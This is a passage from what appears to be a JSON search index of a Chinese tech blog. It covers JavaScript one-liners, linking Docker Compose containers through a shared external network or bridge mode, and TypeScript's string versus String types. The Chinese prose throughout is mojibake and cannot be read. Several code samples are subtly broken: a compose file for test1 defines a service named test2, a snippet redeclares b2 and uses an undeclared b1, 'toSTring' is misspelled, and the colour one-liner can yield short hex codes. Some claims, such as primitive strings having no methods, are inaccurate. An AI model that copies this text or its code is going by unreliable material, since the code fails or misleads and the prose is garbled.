(element) =\u0026gt; element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;start\u0026#34; }); æ»‘åˆ°åº•éƒ¨ ä¸€æ¨£ä½¿ç”¨ scrollIntoView å°±å¯ä»¥ï¼Œåªéœ€è¦å°‡ block å€¼æ”¹æˆ endã€‚\n1 2 const scrollToBottom = (element) =\u0026gt; element.scrollIntoView({ behavior: \u0026#34;smooth\u0026#34;, block: \u0026#34;end\u0026#34; }); ç”¢ç”Ÿéš¨æ©Ÿé¡è‰² å¦‚æœæ‚¨éœ€è¦éš¨æ©Ÿè‰²ç¢¼ï¼Œå¯ä»¥åƒè€ƒé€™æ®µï¼š\n1 2 const generateRandomHexColor = () =\u0026gt; `#${Math.floor(Math.random() * 0xffffff).toString(16)}`; ","date":"2022-12-05T00:00:00Z","image":"https://live.staticflickr.com/65535/52544218553_b60d2ccdec_o.jpg","permalink":"https://wayneblog.ga/2022-12-05/js-7-killer-one-liners/","title":"ä¸€è¡Œ JavaScript å°±èƒ½å®Œæˆçš„ 7 å€‹å°ä»»å‹™ï¼"},{"content":" åƒè€ƒç¶²ç«™\nåœ¨ Docker ä¸­ï¼Œå®¹å™¨ä¹‹é–“çš„éˆæ¥æ˜¯ä¸€ç¨®å¾ˆå¸¸è¦‹çš„æ“ä½œï¼Œå®ƒæä¾›äº†è¨ªå•å…¶ä¸­çš„æŸå€‹å®¹å™¨çš„ç¶²çµ¡æœå‹™è€Œä¸éœ€è¦å°‡æ‰€éœ€çš„ç«¯å£æš´éœ²çµ¦ Docker Host ä¸»æ©Ÿçš„åŠŸèƒ½ã€‚Docker Compose ä¸­å°è©²ç‰¹æ€§çš„æ”¯æŒåŒæ¨£æ˜¯å¾ˆæ–¹ä¾¿çš„ã€‚ç„¶è€Œï¼Œå¦‚æœéœ€è¦éˆæ¥çš„å®¹å™¨æ²’æœ‰å®šç¾©åœ¨åŒä¸€å€‹ docker-compose.yml ä¸­çš„æ™‚å€™ï¼Œé€™å€‹æ™‚å€™å°±ç¨å¾®éº»ç…©è¤‡é›œäº†é»ã€‚\nä¸ä½¿ç”¨ Docker Compose åœ¨ä¸ä½¿ç”¨Docker Composeçš„æ™‚å€™ï¼Œå°‡å…©å€‹å®¹å™¨éˆæ¥èµ·ä¾†ä½¿ç”¨â€”linkåƒæ•¸ï¼Œç›¸å°ä¾†èªªæ¯”è¼ƒç°¡å–®ï¼Œä»¥nginxé¡åƒç‚ºä¾‹å­ï¼š\n1 2 docker run --rm --name test1 -d nginx # é–‹å•Ÿä¸€å€‹å¯¦ä¾‹test1 docker run --rm --name test2 --link test1 -d nginx # é–‹å•Ÿä¸€å€‹å¯¦ä¾‹test2ä¸¦èˆ‡test1å»ºç«‹éˆæ¥ é€™æ¨£ï¼Œtest2 èˆ‡ test1 ä¾¿å»ºç«‹äº†éˆæ¥ï¼Œå°±å¯ä»¥åœ¨ test2 ä¸­ä½¿ç”¨è¨ªå• test1 ä¸­çš„æœå‹™äº†ã€‚\nä½¿ç”¨Docker Compose å¦‚æœä½¿ç”¨ Docker Composeï¼Œé‚£éº¼é€™å€‹äº‹æƒ…å°±æ›´ç°¡å–®äº†ï¼Œé‚„æ˜¯ä»¥ä¸Šé¢çš„ nginx é¡åƒç‚ºä¾‹å­ï¼Œç·¨è¼¯ docker-compose.yml æ–‡ä»¶ç‚ºï¼š\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 version: \u0026#34;3\u0026#34; services: test2: image: nginx depends_on: - test1 links: - test1 test1: image: nginx æœ€çµ‚æ•ˆæœèˆ‡ä½¿ç”¨æ™®é€šçš„ Docker å‘½ä»¤ docker run xxxx å»ºç«‹çš„éˆæ¥ä¸¦ç„¡å€åˆ¥ã€‚é€™åªæ˜¯ä¸€ç¨®æœ€ç‚ºç†æƒ³çš„æƒ…æ³ã€‚\nå•é¡Œ å¦‚æœå®¹å™¨æ²’æœ‰å®šç¾©åœ¨åŒä¸€å€‹ docker-compose.yml æ–‡ä»¶ä¸­ï¼Œæ‡‰è©²å¦‚ä½•éˆæ¥å®ƒå€‘å‘¢ï¼Ÿ å¦‚æœå®šç¾©åœ¨ docker-compose.yml æ–‡ä»¶ä¸­çš„å®¹å™¨éœ€è¦èˆ‡ docker run xxx å•Ÿå‹•çš„å®¹å™¨éˆæ¥ï¼Œéœ€è¦å¦‚ä½•è™•ç†ï¼Ÿ æ–¹æ³•ä¸€ï¼šè®“éœ€è¦éˆæ¥çš„å®¹å™¨åŒå±¬ä¸€å€‹å¤–éƒ¨ç¶²çµ¡ æˆ‘å€‘é‚„æ˜¯ä½¿ç”¨ nginx é¡åƒä¾†æ¨¡æ“¬é€™æ¨£çš„ä¸€å€‹æƒ…æ™¯ï¼šå‡è¨­æˆ‘å€‘éœ€è¦å°‡å…©å€‹ä½¿ç”¨ Docker Compose ç®¡ç†çš„ nignx å®¹å™¨(test1å’Œtest2)éˆæ¥èµ·ä¾†ï¼Œä½¿å¾— test2 èƒ½å¤ è¨ªå• test1 ä¸­æä¾›çš„æœå‹™ï¼Œé€™è£¡æˆ‘å€‘ä»¥èƒ½ ping é€šç‚ºæº–ã€‚\né¦–å…ˆï¼Œæˆ‘å€‘å®šç¾©å®¹å™¨ test1 çš„ docker-compose.yml æ–‡ä»¶å…§å®¹ç‚ºï¼š\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 version: \u0026#34;3\u0026#34; services: test2: image: nginx container_name: test1 networks: - default - app_net networks: app_net: external: true å®¹å™¨ test2 å…§å®¹èˆ‡ test1 åŸºæœ¬ä¸€æ¨£ï¼Œåªæ˜¯å¤šäº†ä¸€å€‹ external_linksã€‚\néœ€è¦ç‰¹åˆ¥èªªæ˜çš„æ˜¯ï¼šæœ€è¿‘ç™¼å¸ƒçš„ Docker ç‰ˆæœ¬å·²ç¶“ä¸éœ€è¦ä½¿ç”¨ external_links ä¾†éˆæ¥å®¹å™¨ï¼Œå®¹å™¨çš„ DNS æœå‹™å¯ä»¥æ­£ç¢ºçš„ä½œå‡ºåˆ¤æ–·ï¼Œå› æ­¤å¦‚æœä½ ä½ éœ€è¦å…¼å®¹è¼ƒè€ç‰ˆæœ¬çš„ Docker çš„è©±ï¼Œé‚£éº¼å®¹å™¨ test2 çš„ docker-compose.yml æ–‡ä»¶å…§å®¹ç‚ºï¼š\ndocker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 version: \u0026#34;3\u0026#34; services: test2: image: nginx networks: - default - app_net external_links: - test1 container_name: test2 networks: app_net: external: true å¦å‰‡çš„è©±ï¼Œtest2 çš„ docker-compose.yml å’Œ test1 çš„å®šç¾©å®Œå…¨ä¸€è‡´ï¼Œä¸éœ€è¦é¡å¤–å¤šæŒ‡å®šä¸€å€‹ external_linksã€‚ç›¸é—œçš„å•é¡Œè«‹åƒè¦‹ stackoverflow ä¸Šçš„ç›¸é—œå•é¡Œï¼šdocker-compose + external container\næ­£å¦‚ä½ çœ‹åˆ°çš„é‚£æ¨£ï¼Œé€™è£¡å…©å€‹å®¹å™¨çš„å®šç¾©è£¡éƒ½ä½¿ç”¨äº†åŒä¸€å€‹å¤–éƒ¨ç¶²çµ¡ app_netï¼Œå› æ­¤ï¼Œæˆ‘å€‘éœ€è¦åœ¨å•Ÿå‹•é€™å…©å€‹å®¹å™¨ä¹‹å‰é€šéä»¥ä¸‹å‘½ä»¤å†å‰µå»ºå¤–éƒ¨ç¶²çµ¡ï¼š\n1 docker network create app_net ä¹‹å¾Œï¼Œé€šé docker-compose up -d å‘½ä»¤å•Ÿå‹•é€™å…©å€‹å®¹å™¨ï¼Œç„¶å¾ŒåŸ·è¡Œ docker exec -it test2 ping test1ï¼Œä½ å°‡æœƒçœ‹åˆ°å¦‚ä¸‹çš„è¼¸å‡ºï¼š\n1 2 3 4 5 6 7 8 $ docker exec -it test2 ping test1 PING test1 (172.18.0.2): 56 data bytes 64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.091 ms 64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.146 ms 64 bytes from 172.18.0.2: icmp_seq=2 ttl=64 time=0.150 ms 64 bytes from 172.18.0.2: icmp_seq=3 ttl=64 time=0.145 ms 64 bytes from 172.18.0.2: icmp_seq=4 ttl=64 time=0.126 ms 64 bytes from 172.18.0.2: icmp_seq=5 ttl=64 time=0.147 ms è­‰æ˜é€™å…©å€‹å®¹å™¨æ˜¯æˆåŠŸéˆæ¥äº†ï¼Œåéä¾†åœ¨ test1 ä¸­ ping test2 ä¹Ÿæ˜¯èƒ½å¤ æ­£å¸¸ ping é€šçš„ã€‚\nå¦‚æœæˆ‘å€‘é€šé docker run --rm --name test3 -d nginx é€™ç¨®æ–¹å¼ä¾†å…ˆå•Ÿå‹•äº†ä¸€å€‹å®¹å™¨(test3)ï¼Œä¸¦ä¸”æ²’æœ‰æŒ‡å®šå®ƒæ‰€å±¬çš„å¤–éƒ¨ç¶²çµ¡ï¼Œè€Œéœ€è¦å°‡å…¶èˆ‡ test1 æˆ–è€… test2 éˆæ¥çš„è©±ï¼Œé€™å€‹æ™‚å€™æ‰‹å‹•éˆæ¥å¤–éƒ¨ç¶²çµ¡å³å¯ï¼š\n1 docker network connect app_net test3 é€™æ¨£ï¼Œä¸‰å€‹å®¹å™¨éƒ½å¯ä»¥ç›¸äº’è¨ªå•äº†ã€‚\næ–¹æ³•äºŒï¼šæ›´æ”¹éœ€è¦éˆæ¥çš„å®¹å™¨çš„ç¶²çµ¡æ¨¡å¼ é€šéæ›´æ”¹ä½ æƒ³è¦ç›¸äº’éˆæ¥çš„å®¹å™¨çš„ç¶²çµ¡æ¨¡å¼ç‚º bridgeï¼Œä¸¦æŒ‡å®šéœ€è¦éˆæ¥çš„å¤–éƒ¨å®¹å™¨(external_links)å³å¯ã€‚\nèˆ‡åŒå±¬å¤–éƒ¨ç¶²çµ¡çš„å®¹å™¨å¯ä»¥ç›¸äº’è¨ªå•çš„éˆæ¥æ–¹å¼ä¸€ä¸åŒï¼Œé€™ç¨®æ–¹å¼çš„è¨ªå•æ˜¯å–®å‘çš„ã€‚\né‚„æ˜¯ä»¥ nginx å®¹å™¨é¡åƒç‚ºä¾‹å­ï¼Œå¦‚æœå®¹å™¨å¯¦ä¾‹ nginx1 éœ€è¦è¨ªå•å®¹å™¨å¯¦ä¾‹ nginx2ï¼Œé‚£éº¼ nginx2 çš„ docker-compose.yml å®šç¾©ç‚ºï¼š\ndocker-compose.yml 1 2 3 4 5 6 version: \u0026#34;3\u0026#34; services: nginx2: image: nginx container_name: nginx2 network_mode: bridge èˆ‡å…¶å°æ‡‰çš„ï¼Œnginx1 çš„ docker-compose.yml å®šç¾©ç‚ºï¼š\ndocker-compose.yml 1 2 3 4 5 6 7 8 version: \u0026#34;3\u0026#34; services: nginx1: image: nginx external_links: - nginx2 container_name: nginx1 network_mode: bridge éœ€è¦ç‰¹åˆ¥èªªæ˜çš„æ˜¯ï¼Œé€™è£¡çš„ external_links æ˜¯ä¸èƒ½çœç•¥çš„ï¼Œè€Œä¸” nginx1 çš„å•Ÿå‹•å¿…é ˆè¦åœ¨ nginx2 ä¹‹å¾Œï¼Œå¦å‰‡å¯èƒ½æœƒå ±æ‰¾ä¸åˆ°å®¹å™¨ nginx2 çš„éŒ¯èª¤ã€‚\næ¥è‘—æˆ‘å€‘ä½¿ç”¨ ping ä¾†æ¸¬è©¦ä¸‹é€£é€šæ€§ï¼š\n1 2 3 4 5 6 7 8 $ docker exec -it nginx1 ping nginx2 # nginx1 to nginx2 PING nginx2 (172.17.0.4): 56 data bytes 64 bytes from 172.17.0.4: icmp_seq=0 ttl=64 time=0.141 ms 64 bytes from 172.17.0.4: icmp_seq=1 ttl=64 time=0.139 ms 64 bytes from 172.17.0.4: icmp_seq=2 ttl=64 time=0.145 ms $ docker exec -it nginx2 ping nginx1 #nginx2 to nginx1 ping: unknown host ä»¥ä¸Šä¹Ÿèƒ½å……åˆ†è­‰æ˜é€™ç¨®æ–¹å¼æ˜¯å±¬æ–¼å–®å‘è¯é€šçš„ã€‚\nåœ¨å¯¦éš›æ‡‰ç”¨ä¸­æ ¹æ“šè‡ªå·±çš„éœ€è¦éˆæ´»çš„é¸æ“‡é€™å…©ç¨®éˆæ¥æ–¹å¼ï¼Œå¦‚æœæƒ³å·æ‡¶çš„è©±ï¼Œå¤§å¯é¸æ“‡ç¬¬äºŒç¨®ã€‚ä¸éæˆ‘æ›´æ¨è–¦ç¬¬ä¸€ç¨®ï¼Œä¸é›£çœ‹å‡ºç„¡è«–æ˜¯è¯é€šæ€§é‚„æ˜¯éˆæ´»æ€§ï¼Œè¼ƒç‚ºæ›´æ”¹ç¶²çµ¡æ¨¡å¼çš„ç¬¬äºŒç¨®éƒ½æ›´ç‚ºå‹å¥½ã€‚\n","date":"2022-12-04T00:00:00Z","image":"https://live.staticflickr.com/65535/52565233288_251b1a5202_o.jpg","permalink":"https://wayneblog.ga/2022-12-04/docker-compose-link-external-comtainer/","title":"Docker Compose éˆæ¥å¤–éƒ¨å®¹å™¨çš„å¹¾ç¨®æ–¹å¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nèƒŒæ™¯ èˆ‡ JavaScript èªè¨€ä¸åŒçš„æ˜¯ï¼ŒTypeScript ä½¿ç”¨çš„æ˜¯éœæ…‹å‹åˆ¥(å¼·å‹åˆ¥)ï¼Œæ¯”å¦‚èªªå®ƒæŒ‡å®šäº†è®Šæ•¸å¯ä»¥å„²å­˜çš„è³‡æ–™å‹åˆ¥ã€‚\nå¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œå¦‚æœåœ¨ JS ä¸­ï¼ŒæŒ‡å®šè®Šæ•¸å¯ä»¥å„²å­˜çš„è³‡æ–™å‹åˆ¥ï¼Œæœƒå ±éŒ¯ï¼šâ€œå‹åˆ¥è¨»é‡‹åªå¯ä»¥åœ¨TSæª”æ¡ˆä¸­è¢«ä½¿ç”¨â€ï¼š\nTypeScript æ˜¯ JavaScript çš„è¶…é›†(superset)ï¼ŒTypeScript éœ€è¦ç·¨è­¯(èªæ³•è½‰æ›)ç”Ÿæˆ JavaScript æ‰èƒ½è¢«ç€è¦½å™¨åŸ·è¡Œï¼Œå®ƒä¹Ÿå€åˆ†äº† string å’Œ String é€™å…©å€‹è³‡æ–™å‹åˆ¥ã€‚é€šå¸¸ä¾†èªªï¼Œstring è¡¨ç¤ºåŸç”Ÿå‹åˆ¥ï¼Œè€Œ String è¡¨ç¤ºç‰©ä»¶ã€‚\nåŸç”Ÿ string JavaScript åœ¨ ES6 æ¨™æº–è£¡æ”¯æ´6ç¨®åŸç”Ÿå‹åˆ¥ï¼Œstring æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚\n1 2 3 4 5 6 let testVar1: number = 19; let testVar2: boolean = true; let testVar3: string =\u0026#34;Hi Wayne!\u0026#34;; let testVar4: null = null; let testVar5: undefined = undefined; let testVar6: object = new String(\u0026#34;Wayne Cloud!\u0026#34;); åŸç”Ÿçš„ string æ˜¯ä¸åŒ…å«å±¬æ€§çš„å€¼(å³æ²’æœ‰properties)ï¼ŒåŒ…æ‹¬å­—é¢ä¸Šæ²’æœ‰å®šç¾©å‹åˆ¥ã€å­—é¢ä¸Šå®šç¾©äº† stringã€å­—é¢ä¸Šå®šç¾©äº† Stringå’Œä¸€äº›å¾ string å‡½å¼å‘¼å«è¿”å›çš„ strings ä¹Ÿéƒ½å¯ä»¥è¢«æ­¸ç‚ºåŸç”Ÿå‹åˆ¥ï¼š\n1 2 3 let msg1: string = \u0026#34;Hello world!\u0026#34;; let msg2: string = \u0026#34;Hello world!\u0026#34;; let msg22 = returnStr(); ä»¥ä¸Šä¸‰å€‹è®Šæ•¸çš„å‹åˆ¥(typeof())æ˜¯ stringã€‚\nç‰©ä»¶ String ç‰©ä»¶æ˜¯ä¸åŒå±¬æ€§çš„ç´¯ç©ï¼Œä¸€å€‹ç‰©ä»¶å¯ä»¥å‘¼å«è¨±å¤šç›¸æ‡‰çš„æ–¹æ³•ã€‚\n1 let msg3: String = new String(\u0026#39;Hello world!\u0026#39;); é€™å€‹è®Šæ•¸ msg3 çš„å‹åˆ¥å°±æ˜¯ objectï¼š\n1 console.log(typeof(msg3)); // object String ç‰©ä»¶æ”¯æ´çš„æ–¹æ³•ï¼š\nNo. Method Description 1. charAt() charAt() æ–¹æ³•å¾ä¸€å€‹å­—ç¬¦ä¸²ä¸­è¿”å›æŒ‡å®šçš„å­—ç¬¦ 2. charCodeAt() charCodeAt() æ–¹æ³•è¿”å› 0 åˆ° 65535 ä¹‹é–“çš„æ•´æ•¸ï¼Œè¡¨ç¤ºçµ¦å®šç´¢å¼•è™•çš„ UTF-16 ä»£ç¢¼å–®å…ƒ 3. concat() concat() æ–¹æ³•å°‡ä¸€å€‹æˆ–å¤šå€‹å­—ç¬¦ä¸²èˆ‡åŸå­—ç¬¦ä¸²é€£æ¥åˆä½µï¼Œå½¢æˆä¸€å€‹æ–°çš„å­—ç¬¦ä¸²ä¸¦è¿”å› 4. indexOf() indexOf() æ–¹æ³•ï¼Œçµ¦å®šä¸€å€‹åƒæ•¸ï¼šè¦æœç´¢çš„å­å­—ç¬¦ä¸²ï¼Œæœç´¢æ•´å€‹èª¿ç”¨å­—ç¬¦ä¸²ï¼Œä¸¦è¿”å›æŒ‡å®šå­å­—ç¬¦ä¸²ç¬¬ä¸€æ¬¡å‡ºç¾çš„ç´¢å¼•ã€‚çµ¦å®šç¬¬äºŒå€‹åƒæ•¸ï¼šä¸€å€‹æ•¸å­—ï¼Œè©²æ–¹æ³•å°‡è¿”å›æŒ‡å®šå­å­—ç¬¦ä¸²åœ¨å¤§æ–¼æˆ–ç­‰æ–¼æŒ‡å®šæ•¸å­—çš„ç´¢å¼•è™•çš„ç¬¬ä¸€æ¬¡å‡ºç¾ 5. lastIndexOf() lastIndexOf() æ–¹æ³•è¿”å›èª¿ç”¨ String å°è±¡çš„æŒ‡å®šå€¼æœ€å¾Œä¸€æ¬¡å‡ºç¾çš„ç´¢å¼•ï¼Œåœ¨ä¸€å€‹å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šä½ç½® fromIndex è™•å¾å¾Œå‘å‰æœç´¢ã€‚å¦‚æœæ²’æ‰¾åˆ°é€™å€‹ç‰¹å®šå€¼å‰‡è¿”å› -1ã€‚è©²æ–¹æ³•å°‡å¾å°¾åˆ°é ­åœ°æª¢ç´¢å­—ç¬¦ä¸² strï¼Œçœ‹å®ƒæ˜¯å¦å«æœ‰å­ä¸² searchValueã€‚é–‹å§‹æª¢ç´¢çš„ä½ç½®åœ¨å­—ç¬¦ä¸²çš„ fromIndex è™•æˆ–å­—ç¬¦ä¸²çš„çµå°¾(æ²’æœ‰æŒ‡å®š fromIndex æ™‚)ã€‚å¦‚æœæ‰¾åˆ°ä¸€å€‹ searchValueï¼Œå‰‡è¿”å› searchValue çš„ç¬¬ä¸€å€‹å­—ç¬¦åœ¨ str ä¸­çš„ä½ç½®ã€‚ str ä¸­çš„å­—ç¬¦ä½ç½®æ˜¯å¾ 0 é–‹å§‹çš„ 6. localeCompare() localeCompare() æ–¹æ³•è¿”å›ä¸€å€‹æ•¸å­—ä¾†æŒ‡ç¤ºä¸€å€‹åƒè€ƒå­—ç¬¦ä¸²æ˜¯å¦åœ¨æ’åºé †åºå‰é¢æˆ–ä¹‹å¾Œæˆ–èˆ‡çµ¦å®šå­—ç¬¦ä¸²ç›¸åŒã€‚æ–°çš„ locales å’Œ options åƒæ•¸èƒ½è®“æ‡‰ç”¨ç¨‹åºå®šåˆ¶å‡½æ•¸çš„è¡Œç‚ºï¼Œå³æŒ‡å®šç”¨ä¾†æ’åºçš„èªè¨€ã€‚ locales å’Œ options åƒæ•¸å®Œå…¨å–æ±ºæ–¼å¯¦ç¾ï¼Œåœ¨èˆŠçš„å¯¦ç¾ä¸­å¿½ç•¥é€™å…©å€‹åƒæ•¸ 7. match() match() æ–¹æ³•æª¢ç´¢è¿”å›ä¸€å€‹å­—ç¬¦ä¸²åŒ¹é…æ­£å‰‡è¡¨é”å¼çš„çµæœ 8. replace() replace() æ–¹æ³•è¿”å›ä¸€å€‹ç”±æ›¿æ›å€¼(replacement)æ›¿æ›éƒ¨åˆ†æˆ–æ‰€æœ‰çš„æ¨¡å¼(pattern)åŒ¹é…é …å¾Œçš„æ–°å­—ç¬¦ä¸²ã€‚æ¨¡å¼å¯ä»¥æ˜¯ä¸€å€‹å­—ç¬¦ä¸²æˆ–è€…ä¸€å€‹æ­£å‰‡è¡¨é”å¼ï¼Œæ›¿æ›å€¼å¯ä»¥æ˜¯ä¸€å€‹å­—ç¬¦ä¸²æˆ–è€…ä¸€å€‹æ¯æ¬¡åŒ¹é…éƒ½è¦èª¿ç”¨çš„å›èª¿å‡½æ•¸ã€‚å¦‚æœ pattern æ˜¯å­—ç¬¦ä¸²ï¼Œå‰‡åƒ…æ›¿æ›ç¬¬ä¸€å€‹åŒ¹é…é … 9. search() search() æ–¹æ³•åŸ·è¡Œæ­£å‰‡è¡¨é”å¼å’Œ String å°è±¡ä¹‹é–“çš„ä¸€å€‹æœç´¢åŒ¹é… 10. slice() slice() æ–¹æ³•æå–æŸå€‹å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¸¦è¿”å›ä¸€å€‹æ–°çš„å­—ç¬¦ä¸²ï¼Œä¸”ä¸æœƒæ”¹å‹•åŸå­—ç¬¦ä¸² 11. split() split() æ–¹æ³•ä½¿ç”¨æŒ‡å®šçš„åˆ†éš”ç¬¦å­—ç¬¦ä¸²å°‡ä¸€å€‹ String å°è±¡åˆ†å‰²æˆå­å­—ç¬¦ä¸²æ•¸çµ„ï¼Œä»¥ä¸€å€‹æŒ‡å®šçš„åˆ†å‰²å­—ä¸²ä¾†æ±ºå®šæ¯å€‹æ‹†åˆ†çš„ä½ç½® 12. substr() substr() æ–¹æ³•è¿”å›ä¸€å€‹å­—ç¬¦ä¸²ä¸­å¾æŒ‡å®šä½ç½®é–‹å§‹åˆ°æŒ‡å®šå­—ç¬¦æ•¸çš„å­—ç¬¦ 13. substring() substring() æ–¹æ³•è¿”å›ä¸€å€‹å­—ç¬¦ä¸²åœ¨é–‹å§‹ç´¢å¼•åˆ°çµæŸç´¢å¼•ä¹‹é–“çš„ä¸€å€‹å­é›†ï¼Œæˆ–å¾é–‹å§‹ç´¢å¼•ç›´åˆ°å­—ç¬¦ä¸²çš„æœ«å°¾çš„ä¸€å€‹å­é›† 14. toLocaleLowerCase() toLocaleLowerCase() æ–¹æ³•æ ¹æ“šä»»ä½•æŒ‡å®šå€åŸŸèªè¨€ç’°å¢ƒè¨­ç½®çš„å¤§å°å¯«æ˜ å°„ï¼Œè¿”å›èª¿ç”¨å­—ç¬¦ä¸²è¢«è½‰æ›ç‚ºå°å¯«çš„æ ¼å¼ 15. toLocaleUpperCase() toLocaleUpperCase() æ–¹æ³•æ ¹æ“šæœ¬åœ°ä¸»æ©Ÿèªè¨€ç’°å¢ƒæŠŠå­—ç¬¦ä¸²è½‰æ›ç‚ºå¤§å¯«æ ¼å¼ï¼Œä¸¦è¿”è¿´è½‰æ›å¾Œçš„å­—ç¬¦ä¸² 16. toLowerCase() toLowerCase() æœƒå°‡èª¿ç”¨è©²æ–¹æ³•çš„å­—ç¬¦ä¸²å€¼è½‰ç‚ºå°å¯«å½¢å¼ï¼Œä¸¦è¿”å› 17. toString() å­—ç¬¦ä¸²å°è±¡çš„ toString() æ–¹æ³•è¿”å›ä¸€å€‹å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæŒ‡å®šçš„å­—ç¬¦ä¸² 18. toUpperCase() toUpperCase() æ–¹æ³•å°‡èª¿ç”¨è©²æ–¹æ³•çš„å­—ç¬¦ä¸²è½‰ç‚ºå¤§å¯«å½¢å¼ä¸¦è¿”å›(å¦‚æœèª¿ç”¨è©²æ–¹æ³•çš„å€¼ä¸æ˜¯å­—ç¬¦ä¸²é¡å‹æœƒè¢«å¼·åˆ¶è½‰æ›) 19. valueOf() valueOf() æ–¹æ³•è¿”å› String å°è±¡çš„åŸå§‹å€¼ ç¨‹å¼ç¢¼å°æ¯” æˆ‘å€‘å°ä¸‹é¢4å€‹è®Šæ•¸é€²è¡Œå‹åˆ¥çš„æ¢ç´¢èˆ‡æ¯”è¼ƒï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 let msg: string = \u0026#39;Hello world!\u0026#39;; let msg2: String = \u0026#39;Hello world!\u0026#39;; let msg22 = \u0026#39;Hello world!\u0026#39;; // å­—é¢ä¸Šæ²’æœ‰å®šç¾©å‹åˆ¥ let msg3: String = new String(\u0026#39;Hello world!\u0026#39;); console.log(typeof(msg)); // string console.log(typeof(msg2)); // string console.log(typeof(msg22)); // string console.log(typeof(msg3)); // object console.log(msg === msg2); // true console.log(msg === msg3); // false console.log(msg2 === msg3); // false ç‚ºä»€éº¼éœ€è¦ String ç‰©ä»¶ é¦–å…ˆï¼Œç•¶æˆ‘å€‘ä½¿ç”¨é—œéµå­— new æ–°å»ºä¸€å€‹ String ç‰©ä»¶çš„æ™‚å€™ï¼ŒTypescript æœƒå»ºç«‹ä¸€å€‹æ–°çš„ç‰©ä»¶ï¼›\nå³æˆ‘å€‘ç”¨ new æ–°å»ºäº†å…©å€‹ String ç‰©ä»¶ï¼Œå³ä½¿å…§å®¹ç›¸åŒï¼Œå®ƒå€‘ä¹Ÿæ˜¯æŒ‡å‘ä¸åŒçš„è¨˜æ†¶é«”ã€‚\nèˆ‰ä¸‹é¢å…©å€‹ä¾‹å­ï¼š\nç•¶ç”¨ a1ã€b1 ä»£è¡¨ç›¸åŒå€¼çš„å…©å€‹è®Šæ•¸çš„æ™‚å€™ï¼Œå®ƒå€‘æ˜¯ç›¸åŒçš„ï¼›è€Œç•¶ç”¨ new æ–°å»ºå…©å€‹ç‰©ä»¶çš„æ™‚å€™ï¼Œå³ä½¿å€¼ç›¸åŒï¼Œå®ƒå€‘ä¹Ÿæ˜¯ä¸åŒçš„ï¼š 1 2 3 4 5 6 7 let a1 = \u0026#34;Hello World\u0026#34;; let b2 = \u0026#34;Hello World\u0026#34;; console.log(a1 === b1); // true let a2 = new String(\u0026#34;Hello World\u0026#34;); let b2 = new String(\u0026#34;Hello World\u0026#34;); console.log(a2 === b2); // false eval() å‡½å¼çš„ä½œç”¨ï¼šç”¨ä¾†è¨ˆç®—è¡¨ç¤ºå¼çš„å€¼ã€‚å¦‚æœæˆ‘å€‘æŠŠ eval() ç›´æ¥è³¦çµ¦ stringï¼Œè€Œ string è£¡é¢æ˜¯è¨ˆç®—å¼çš„å­—ä¸²ï¼Œé‚£éº¼å®ƒæœƒè¿”å›è¨ˆç®—å¾Œçš„å€¼ï¼›è€Œå¦‚æœæˆ‘å€‘æŠŠ eval() è³¦çµ¦ Stringï¼Œå› ç‚ºå®ƒä¸æ˜¯åŸç”Ÿå‹åˆ¥ï¼Œå®ƒåªæœƒè¿”å› String é€™å€‹ç‰©ä»¶ï¼š 1 2 3 4 5 6 let a3 = \u0026#34;3 * 9\u0026#34;; console.log(eval(a3)); // 27 let b3 = new String(\u0026#34;8 + 20\u0026#34;); console.log(eval(b3)); // Warningï¼šArgument of type \u0026#39;String\u0026#39; is not assignable to parameter of type \u0026#39;string\u0026#39;. \u0026#39;string\u0026#39; is a primitive, but \u0026#39;String\u0026#39; is a wrapper object. Prefer using \u0026#39;string\u0026#39; when possible.ts(2345) console.log(eval(b3.toSTring())); // 28 å…¶æ¬¡ï¼Œå› ç‚º String ç‰©ä»¶å¯ä»¥æœ‰å±¬æ€§ã€‚æˆ‘å€‘å¯ä»¥ç”¨ String ç‰©ä»¶åœ¨å±¬æ€§è£¡ä¿ç•™ä¸€å€‹é¡å¤–çš„å€¼ã€‚å³ä½¿é€™å€‹ç”¨æ³•ä¸¦ä¸å¸¸è¦‹ï¼Œä½†æ˜¯ä»ç„¶æ˜¯ TS çš„ä¸€å€‹ç‰¹æ€§ï¼š 1 2 3 4 5 6 let prim = \u0026#39;hello Wayne\u0026#39;; let obj = new String(\u0026#39;hello Wayne Cloud\u0026#39;); prim.property = \u0026#39;PaaS\u0026#39;; // Invalid obj.property = \u0026#39;PaaS\u0026#39;; // Valid console.log(obj.property); // è¼¸å‡ºç‚º PaaS å…©è€…å€åˆ¥ç¸½çµ string åŸç”Ÿå‹åˆ¥ String ç‰©ä»¶ å»£æ³›è¢«ä½¿ç”¨ å¹¾ä¹å¾ˆå°‘è¢«ä½¿ç”¨ åªæœƒä¿ç•™å€¼ æœ‰èƒ½åŠ›é™¤äº†å€¼ä¹‹å¤–ï¼Œé‚„å¯ä»¥ä¿ç•™å±¬æ€§ å€¼æ˜¯ä¸å¯è®Šçš„ï¼Œå› æ­¤åŸ·è¡Œç·’å®‰å…¨ Stringç‰©ä»¶æ˜¯å¯è®Šçš„ æ²’æœ‰ä»»ä½•æ–¹æ³• Stringç‰©ä»¶æœ‰å„ç¨®æ–¹æ³• ä¸èƒ½å»ºç«‹å…©å€‹ç¨ç«‹çš„å­—é¢ä¸Šå€¼ç›¸åŒçš„ string å¯ä»¥ç”¨ new å»ºç«‹å…©å€‹ç‰©ä»¶ æ˜¯åŸç”Ÿçš„è³‡æ–™å‹åˆ¥ åŒ…è£åŸç”Ÿè³‡æ–™å‹åˆ¥ä¾†å»ºç«‹ä¸€å€‹ç‰©ä»¶ å‚³éçš„å€¼æ˜¯åŸç”Ÿè³‡æ–™æœ¬èº«çš„æ‹·è² å‚³éçš„å€¼æ˜¯å¯¦éš›è³‡æ–™çš„å¼•ç”¨ 